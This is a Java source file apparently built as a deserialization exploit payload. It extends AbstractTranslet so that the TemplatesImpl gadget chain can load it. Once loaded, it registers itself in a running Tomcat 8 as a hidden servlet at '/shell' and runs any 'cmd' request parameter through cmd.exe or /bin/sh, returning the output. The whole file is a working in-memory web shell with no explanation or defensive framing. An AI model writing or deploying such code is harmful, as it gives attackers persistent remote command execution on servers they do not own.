package test;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.*;
import java.util.Scanner;

import javax.servlet.*;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

public class TemplatesImplTomcat8ServletShell extends AbstractTranslet implements  Servlet{
    public TemplatesImplTomcat8ServletShell() throws Exception {
        
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    	StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName("shell");
        wrapper.setServlet(this);
        
        standardContext.addChild(wrapper);
        standardContext.addServletMappingDecoded("/shell", "shell");
    	
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
	@Override
	public void init(ServletConfig config) throws ServletException {
	}
	@Override
	public ServletConfig getServletConfig() {
		return null;
	}
	@Override
    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
        String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
		String output = s.hasNext() ? s.next() : "";
        PrintWriter out = response.getWriter();
        response.getWriter().write(output);
        response.getWriter().flush();
    }
	@Override
	public String getServletInfo() {
		return null;
	}
	@Override
	public void destroy() {
	}
}


